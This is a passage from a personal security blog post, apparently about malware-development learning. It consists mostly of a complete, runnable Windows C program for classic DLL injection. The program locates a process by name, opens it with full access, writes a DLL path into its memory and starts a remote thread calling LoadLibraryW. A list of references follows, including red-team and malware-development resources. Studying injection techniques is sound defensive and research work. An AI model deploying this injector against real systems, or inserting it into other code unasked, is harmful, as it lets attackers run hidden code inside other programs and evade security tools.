</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;tlhelp32.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetRemoteProcessHandle</span>(LPWSTR szProcessName, DWORD<span style="color:#f92672">*</span> dwProcessId, HANDLE<span style="color:#f92672">*</span> hProcess) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Ensure the dwSize member is set correctly before using Process32First.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PROCESSENTRY32 Proc <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>		.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32)
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	HANDLE hSnapShot <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Capture a snapshot of all running processes.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hSnapShot <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapShot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateToolhelp32Snapshot Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get details of the first process from the snapshot.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">Process32First</span>(hSnapShot, <span style="color:#f92672">&amp;</span>Proc)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Process32First Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>		WCHAR LowerName[MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (Proc.szExeFile) {
</span></span><span style="display:flex;"><span>			DWORD dwSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">lstrlenW</span>(Proc.szExeFile);
</span></span><span style="display:flex;"><span>			DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// overwrite LowerName with zero&#39;s
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">RtlSecureZeroMemory</span>(LowerName, <span style="color:#66d9ef">sizeof</span>(LowerName));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Convert Proc.szExeFile to lowercase and store in LowerName.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> (dwSize <span style="color:#f92672">&lt;</span> MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> (; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>					LowerName[i] <span style="color:#f92672">=</span> (WCHAR)<span style="color:#a6e22e">tolower</span>(Proc.szExeFile[i]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				LowerName[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Check if the process name matches the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">wcscmp</span>(LowerName, szProcessName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">*</span>dwProcessId <span style="color:#f92672">=</span> Proc.th32ProcessID; <span style="color:#75715e">// Save PID.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#f92672">*</span>hProcess <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); <span style="color:#75715e">// Open process handle.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>hProcess <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] OpenProcess Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Move to the next process in the snapshot.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	} <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">Process32Next</span>(hSnapShot, <span style="color:#f92672">&amp;</span>Proc));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Clean up resources.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>_EndOfFunction:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapShot <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hSnapShot);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>dwProcessId <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>hProcess <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">InjectDllToRemoteProcess</span>(IN HANDLE hProcess, IN LPWSTR DllName) {
</span></span><span style="display:flex;"><span>	BOOL bSTATE <span style="color:#f92672">=</span> TRUE;
</span></span><span style="display:flex;"><span>	LPVOID pLoadLibraryW <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	LPVOID pAddress <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Calculate size of the DLL path in bytes (including null terminator).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwSizeToWrite <span style="color:#f92672">=</span> (<span style="color:#a6e22e">lstrlenW</span>(DllName) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(WCHAR);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	SIZE_T lpNumberOfBytesWritten <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	HANDLE hThread <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Fetch LoadLibraryW address from kernel32.dll.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pLoadLibraryW <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;kernel32.dll&#34;</span>), <span style="color:#e6db74">&#34;LoadLibraryW&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pLoadLibraryW <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] GetProcAddress Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Allocate memory in the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(hProcess, NULL, dwSizeToWrite, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pAddress <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] VirtualAllocEx Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] pAddress Allocated At : 0x%p Of Size : %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pAddress, dwSizeToWrite);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[#] Press &lt;Enter&gt; To Write ... &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Write the DLL name to the allocated memory in the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteProcessMemory</span>(hProcess, pAddress, DllName, dwSizeToWrite, <span style="color:#f92672">&amp;</span>lpNumberOfBytesWritten) <span style="color:#f92672">||</span> lpNumberOfBytesWritten <span style="color:#f92672">!=</span> dwSizeToWrite) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] WriteProcessMemory Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Successfully Written %d Bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpNumberOfBytesWritten);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[#] Press &lt;Enter&gt; To Run ... &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create a remote thread to execute LoadLibraryW in the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hThread <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateRemoteThread</span>(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateRemoteThread Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] DONE !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Close thread handle after execution.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">CloseHandle</span>(hThread);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Usage: dll_injection.exe &lt;dll_path&gt; &lt;target_process&gt; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> dllPath <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> targetProcessName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Convert target process name to wide characters.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WCHAR targetProcess[MAX_PATH];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">MultiByteToWideChar</span>(CP_ACP, <span style="color:#ae81ff">0</span>, targetProcessName, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, targetProcess, MAX_PATH);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] DLL to inject: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, dllPath);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Target process: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%S</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, targetProcess);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get the absolute path of the DLL.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">char</span> fullPath[MAX_PATH];
</span></span><span style="display:flex;"><span>	DWORD pathLen <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFullPathNameA</span>(dllPath, MAX_PATH, fullPath, NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pathLen <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> pathLen <span style="color:#f92672">&gt;</span> MAX_PATH) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Could not determine full path for %s. Error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dllPath, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Full DLL path resolved to: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, fullPath);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Convert DLL path to wide characters.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WCHAR wideFullPath[MAX_PATH];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">MultiByteToWideChar</span>(CP_ACP, <span style="color:#ae81ff">0</span>, fullPath, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, wideFullPath, MAX_PATH);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	DWORD processId;
</span></span><span style="display:flex;"><span>	HANDLE hProcess;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetRemoteProcessHandle</span>(targetProcess, <span style="color:#f92672">&amp;</span>processId, <span style="color:#f92672">&amp;</span>hProcess)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Failed to find or access target process </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%S</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, targetProcess);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Process </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%S</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> found with PID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, targetProcess, processId);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Inject the DLL into the target process.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">InjectDllToRemoteProcess</span>(hProcess, wideFullPath)) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] DLL injection failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hProcess);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] DLL successfully injected into process </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%S</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, targetProcess);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(hProcess);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[#] Press &lt;Enter&gt; to exit...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>References</strong></p>
<blockquote>
    <ul>
        <li> [1] <a href="https://www.youtube.com/watch?v=0jX9UoXYLa4&t=1s">Pavel Yosifovich: <i>DLL Injection with CreateRemoteThread</i></a></li>
        <li> [2] <a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">Red Team Notes: <i>DLL Injection</i></a></li>
        <li> [3] <a href="https://www.youtube.com/watch?v=A6EKDAKBXPs&t=2984s">crow: <i>Malware Development: Process Injection</i></a></li>
        <li> [4] <a href="https://maldevacademy.com/">MalDev Academy</a></li>
</i></a></li>
    </ul>
</blockquote>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/dll-injection/">Dll-Injection</a></li>
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="http://localhost:1313/">Journal of Connar</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
